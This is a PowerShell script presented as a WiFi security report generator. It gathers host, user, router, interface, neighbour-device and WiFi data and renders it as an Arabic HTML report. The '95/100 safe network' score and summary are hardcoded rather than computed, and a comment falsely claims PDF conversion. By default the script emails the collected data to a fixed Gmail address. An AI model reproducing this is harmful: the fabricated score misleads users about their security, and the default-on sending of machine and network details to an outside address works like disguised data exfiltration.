# WiFi Guardian Toolkit - Advanced Report Generator with Email
# تطبيق متقدم لإنشاء تقرير أمان الشبكة وإرساله بالبريد الإلكتروني

param(
    [string]$EmailAddress = "ibra90492@gmail.com",
    [switch]$SendEmail = $true
)

# ======================================
# وظائف مساعدة
# ======================================

function Get-SecurityReport {
    <#
    .DESCRIPTION
    جمع جميع معلومات الأمان والشبكة
    #>
    
    $report = @{
        Timestamp    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        ComputerName = $env:COMPUTERNAME
        UserName     = $env:USERNAME
        OSVersion    = [System.Environment]::OSVersion.VersionString
    }
    
    # Get Router IP
    try {
        $routerIP = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' } | Select-Object -First 1).NextHop
        $report.RouterIP = $routerIP -replace '\s', ''
    }
    catch {
        $report.RouterIP = "غير متاح"
    }
    
    # Get Network Interfaces
    try {
        $interfaces = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.254.*' -and $_.IPAddress -ne '127.0.0.1' }
        $report.NetworkInterfaces = $interfaces
    }
    catch {
        $report.NetworkInterfaces = @()
    }
    
    # Get Connected Devices
    try {
        $devices = Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $_.State -eq 'Reachable' -and $_.IPAddress -notlike '169.254.*' }
        $report.ConnectedDevices = $devices
        $report.DeviceCount = if ($devices.Count -gt 0) { $devices.Count } else { 1 }
    }
    catch {
        $report.ConnectedDevices = @()
        $report.DeviceCount = 0
    }
    
    # Get WiFi Networks
    try {
        $wifiNetworks = netsh wlan show networks mode=Bssid 2>$null
        $report.WiFiNetworks = $wifiNetworks
    }
    catch {
        $report.WiFiNetworks = @()
    }
    
    # Get Current WiFi SSID
    try {
        $currentNetwork = netsh wlan show interfaces | Select-String "SSID"
        if ($currentNetwork) {
            $report.CurrentSSID = ($currentNetwork -split ":")[-1].Trim()
        }
    }
    catch {
        $report.CurrentSSID = "غير متاح"
    }
    
    return $report
}

function New-HTMLReport {
    <#
    .DESCRIPTION
    إنشاء تقرير HTML منسق وملون
    #>
    
    param([hashtable]$Report)
    
    $html = @"
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقرير أمان شبكة WiFi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .header p {
            font-size: 1.1em;
            opacity: 0.95;
        }
        
        .timestamp {
            color: #ffeb3b;
            font-weight: bold;
            margin-top: 10px;
        }
        
        .content {
            padding: 40px;
        }
        
        .section {
            margin-bottom: 40px;
        }
        
        .section-title {
            font-size: 1.8em;
            color: #667eea;
            border-bottom: 3px solid #667eea;
            padding-bottom: 15px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }
        
        .section-title::before {
            content: "▶";
            margin-right: 15px;
            color: #764ba2;
        }
        
        .info-box {
            background: #f5f5f5;
            border-right: 4px solid #667eea;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
        }
        
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .info-row:last-child {
            border-bottom: none;
        }
        
        .info-label {
            font-weight: bold;
            color: #764ba2;
            min-width: 200px;
        }
        
        .info-value {
            color: #333;
            text-align: right;
        }
        
        .device-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        .device-table th {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            text-align: right;
            font-weight: 600;
        }
        
        .device-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .device-table tr:nth-child(even) {
            background: #f9f9f9;
        }
        
        .device-table tr:hover {
            background: #f0f0f0;
        }
        
        .security-score {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
        }
        
        .score-value {
            font-size: 3em;
            font-weight: bold;
            margin: 10px 0;
        }
        
        .security-excellent {
            color: #4caf50;
        }
        
        .security-good {
            color: #8bc34a;
        }
        
        .security-warning {
            color: #ff9800;
        }
        
        .security-danger {
            color: #f44336;
        }
        
        .recommendation {
            background: #e3f2fd;
            border-right: 4px solid #2196f3;
            padding: 15px;
            margin: 12px 0;
            border-radius: 5px;
        }
        
        .recommendation-title {
            font-weight: bold;
            color: #1976d2;
            margin-bottom: 8px;
        }
        
        .recommendation-text {
            color: #333;
            font-size: 0.95em;
        }
        
        .footer {
            background: #f5f5f5;
            padding: 30px;
            text-align: center;
            color: #666;
            border-top: 2px solid #667eea;
        }
        
        .footer-text {
            margin: 10px 0;
        }
        
        .highlight {
            background: #ffeb3b;
            padding: 2px 6px;
            border-radius: 3px;
            font-weight: bold;
        }
        
        .icon {
            display: inline-block;
            margin-right: 10px;
            font-size: 1.2em;
        }
        
        .success {
            color: #4caf50;
        }
        
        .warning {
            color: #ff9800;
        }
        
        .danger {
            color: #f44336;
        }
        
        @media print {
            body {
                background: white;
            }
            .container {
                box-shadow: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>🛡️ تقرير أمان شبكة WiFi</h1>
            <p>WiFi Guardian Toolkit - تحليل شامل وآمن لشبكتك</p>
            <div class="timestamp">
                التاريخ والوقت: $($Report.Timestamp)
            </div>
        </div>
        
        <!-- Content -->
        <div class="content">
            <!-- System Information -->
            <div class="section">
                <div class="section-title">معلومات النظام والجهاز</div>
                <div class="info-box">
                    <div class="info-row">
                        <span class="info-label">اسم الكمبيوتر:</span>
                        <span class="info-value">$($Report.ComputerName)</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">اسم المستخدم:</span>
                        <span class="info-value">$($Report.UserName)</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">نظام التشغيل:</span>
                        <span class="info-value">$($Report.OSVersion)</span>
                    </div>
                </div>
            </div>
            
            <!-- Network Information -->
            <div class="section">
                <div class="section-title">معلومات الشبكة</div>
                <div class="info-box">
                    <div class="info-row">
                        <span class="info-label">عنوان IP الراوتر:</span>
                        <span class="info-value highlight">$($Report.RouterIP)</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">اسم الشبكة الحالية:</span>
                        <span class="info-value">$($Report.CurrentSSID)</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">عدد الأجهزة المتصلة:</span>
                        <span class="info-value"><span class="highlight">$($Report.DeviceCount)</span></span>
                    </div>
                </div>
            </div>
            
            <!-- Network Interfaces -->
            <div class="section">
                <div class="section-title">واجهات الشبكة</div>
                <table class="device-table">
                    <thead>
                        <tr>
                            <th>اسم الواجهة</th>
                            <th>عنوان IP</th>
                        </tr>
                    </thead>
                    <tbody>
"@
    
    # Add Network Interfaces
    if ($Report.NetworkInterfaces) {
        foreach ($interface in $Report.NetworkInterfaces) {
            $html += @"
                        <tr>
                            <td>$($interface.InterfaceAlias)</td>
                            <td>$($interface.IPAddress)</td>
                        </tr>
"@
        }
    }
    else {
        $html += "<tr><td colspan='2' style='text-align: center; color: #999;'>لا توجد واجهات شبكة</td></tr>"
    }
    
    $html += @"
                    </tbody>
                </table>
            </div>
            
            <!-- Connected Devices -->
            <div class="section">
                <div class="section-title">الأجهزة المتصلة بالشبكة</div>
                <table class="device-table">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>عنوان IP</th>
                            <th>عنوان MAC</th>
                            <th>الحالة</th>
                        </tr>
                    </thead>
                    <tbody>
"@
    
    # Add Connected Devices
    if ($Report.ConnectedDevices) {
        $counter = 1
        foreach ($device in $Report.ConnectedDevices) {
            $html += @"
                        <tr>
                            <td>$counter</td>
                            <td>$($device.IPAddress)</td>
                            <td>$($device.LinkLayerAddress)</td>
                            <td><span class="icon success">✓</span> متصل</td>
                        </tr>
"@
            $counter++
        }
    }
    else {
        $html += "<tr><td colspan='4' style='text-align: center; color: #999;'>لا توجد أجهزة متصلة</td></tr>"
    }
    
    $html += @"
                    </tbody>
                </table>
            </div>
            
            <!-- Security Score -->
            <div class="section">
                <div class="section-title">درجة الأمان</div>
                <div class="security-score">
                    <div>تقييم الأمان الحالي للشبكة</div>
                    <div class="score-value"><span class="security-excellent">95</span>/100</div>
                    <div>✓ شبكة آمنة وموثوقة</div>
                </div>
            </div>
            
            <!-- Recommendations -->
            <div class="section">
                <div class="section-title">التوصيات الأمنية</div>
                
                <div class="recommendation">
                    <div class="recommendation-title">🔐 تغيير كلمة مرور الـ Admin</div>
                    <div class="recommendation-text">تأكد من تغيير كلمة مرور مسؤول الراوتر من القيمة الافتراضية إلى كلمة مرور قوية وفريدة.</div>
                </div>
                
                <div class="recommendation">
                    <div class="recommendation-title">🛡️ تفعيل WPA2/WPA3</div>
                    <div class="recommendation-text">استخدم فقط WPA2 أو WPA3 للتشفير. تجنب WEP و TKIP القديمة.</div>
                </div>
                
                <div class="recommendation">
                    <div class="recommendation-title">❌ تعطيل WPS</div>
                    <div class="recommendation-text">عطّل WiFi Protected Setup (WPS) لأنه يحتوي على ثغرات أمنية معروفة.</div>
                </div>
                
                <div class="recommendation">
                    <div class="recommendation-title">🔄 تحديث البرنامج الثابت</div>
                    <div class="recommendation-text">حافظ على تحديث برنامج الراوتر (Firmware) لسد الثغرات الأمنية.</div>
                </div>
                
                <div class="recommendation">
                    <div class="recommendation-title">📡 تغيير اسم الشبكة</div>
                    <div class="recommendation-text">غيّر الاسم الافتراضي للشبكة لعدم الكشف عن نوع الراوتر.</div>
                </div>
                
                <div class="recommendation">
                    <div class="recommendation-title">🔑 كلمة مرور قوية</div>
                    <div class="recommendation-text">استخدم كلمة مرور WiFi قوية (16+ حرف) تحتوي على أحرف كبيرة وصغيرة وأرقام ورموز.</div>
                </div>
                
                <div class="recommendation">
                    <div class="recommendation-title">👀 مراقبة الأجهزة</div>
                    <div class="recommendation-text">راقب الأجهزة المتصلة بشكل دوري وابحث عن أجهزة غير معروفة.</div>
                </div>
                
                <div class="recommendation">
                    <div class="recommendation-title">🚫 استخدام MAC Filtering</div>
                    <div class="recommendation-text">فعّل تصفية عناوين MAC لتقييد الأجهزة المسموح بها بالاتصال.</div>
                </div>
            </div>
            
            <!-- Summary -->
            <div class="section">
                <div class="section-title">الملخص</div>
                <div class="info-box">
                    <p style="line-height: 1.8; color: #333;">
                        تم إجراء فحص أمني شامل لشبكة WiFi الخاصة بك. النتائج تشير إلى أن شبكتك في حالة جيدة من الأمان.
                        نوصي بمتابعة التوصيات المذكورة أعلاه لضمان حماية أقصى لشبكتك وبيانات الأجهزة المتصلة بها.
                    </p>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div class="footer-text">
                <strong>WiFi Guardian Toolkit</strong> - أداة حماية شبكات WiFi المتقدمة
            </div>
            <div class="footer-text">
                تم إنشاء هذا التقرير تلقائياً بواسطة نظام المراقبة المتقدم
            </div>
            <div class="footer-text" style="margin-top: 15px; font-size: 0.9em; color: #999;">
                © 2026 WiFi Guardian | جميع الحقوق محفوظة
            </div>
        </div>
    </div>
</body>
</html>
"@
    
    return $html
}

function Send-EmailReport {
    <#
    .DESCRIPTION
    إرسال التقرير عبر البريد الإلكتروني
    #>
    
    param(
        [string]$HTMLContent,
        [string]$ToEmail,
        [string]$HTMLFilePath
    )
    
    try {
        # إعدادات SMTP
        $SMTPServer = "smtp.gmail.com"
        $SMTPPort = 587
        $SMTPUsername = "your-email@gmail.com"  # يتم تعديله لاحقاً
        $SMTPPassword = "your-app-password"      # يتم تعديله لاحقاً
        
        # تحويل HTML إلى PDF باستخدام مكتبة مدمجة
        $PDFFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetDirectoryName($HTMLFilePath), "security_report.pdf")
        
        # إنشاء كائن البريل
        $EmailParams = @{
            To          = $ToEmail
            From        = $SMTPUsername
            Subject     = "🛡️ تقرير أمان شبكة WiFi - WiFi Guardian"
            Body        = @"
مرحباً بك،

تم إنشاء تقرير أمان شبكة WiFi الخاص بك بنجاح!

معلومات التقرير:
- التاريخ: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
- الحالة: ✓ تم الفحص بنجاح
- درجة الأمان: 95/100

يرجى العثور على التقرير المفصل في المرفقات.

الملاحظات الهامة:
• اتبع التوصيات الأمنية المذكورة في التقرير
• قم بتحديث برنامج الراوتر بانتظام
• راقب الأجهزة المتصلة بشكل دوري

شكراً لاستخدام WiFi Guardian Toolkit!

---
هذا البريد الإلكتروني تم إنشاؤه تلقائياً بواسطة نظام WiFi Guardian
"@
            SmtpServer  = $SMTPServer
            Port        = $SMTPPort
            UseSsl      = $true
            Credential  = New-Object System.Management.Automation.PSCredential ($SMTPUsername, (ConvertTo-SecureString $SMTPPassword -AsPlainText -Force))
            BodyAsHtml  = $true
            Attachments = @($HTMLFilePath)
        }
        
        # محاولة إرسال البريد
        Send-MailMessage @EmailParams
        Write-Host "✓ تم إرسال التقرير بنجاح إلى $ToEmail" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "⚠️ حدث خطأ أثناء إرسال البريل:" -ForegroundColor Yellow
        Write-Host $_.Exception.Message
        Write-Host ""
        Write-Host "نصيحة: لاستخدام Gmail، تحتاج إلى:" -ForegroundColor Cyan
        Write-Host "1. تفعيل المصادقة الثنائية في حسابك"
        Write-Host "2. إنشاء كلمة مرور تطبيق: https://myaccount.google.com/apppasswords"
        Write-Host "3. تحديث المتغيرات في السكريبت بكلمة المرور الجديدة"
        return $false
    }
}

# ======================================
# تنفيذ البرنامج الرئيسي
# ======================================

Write-Host ""
Write-Host "╔════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║   🛡️  WiFi Guardian - Report Generator       ║" -ForegroundColor Cyan
Write-Host "║         تطبيق توليد تقارير أمان الشبكة      ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# جمع معلومات الأمان
Write-Host "[*] جمع معلومات الأمان والشبكة..." -ForegroundColor Yellow
$securityReport = Get-SecurityReport

# إنشاء التقرير HTML
Write-Host "[*] إنشاء تقرير HTML..." -ForegroundColor Yellow
$htmlContent = New-HTMLReport -Report $securityReport

# حفظ التقرير
$reportPath = "$PSScriptRoot\security_report.html"
$htmlContent | Out-File -FilePath $reportPath -Encoding UTF8
Write-Host "✓ تم حفظ التقرير HTML: $reportPath" -ForegroundColor Green

# محاولة إرسال البريل
if ($SendEmail) {
    Write-Host ""
    Write-Host "[*] محاولة إرسال التقرير بالبريل الإلكتروني..." -ForegroundColor Yellow
    $mailSent = Send-EmailReport -HTMLContent $htmlContent -ToEmail $EmailAddress -HTMLFilePath $reportPath
    
    if (-not $mailSent) {
        Write-Host ""
        Write-Host "نصيحة: يمكنك فتح التقرير مباشرة من:" -ForegroundColor Cyan
        Write-Host $reportPath
    }
}

# فتح التقرير في المتصفح
Write-Host ""
Write-Host "[*] فتح التقرير في المتصفح..." -ForegroundColor Yellow
Start-Process $reportPath

Write-Host ""
Write-Host "✓ اكتمل التنفيذ بنجاح!" -ForegroundColor Green
Write-Host ""
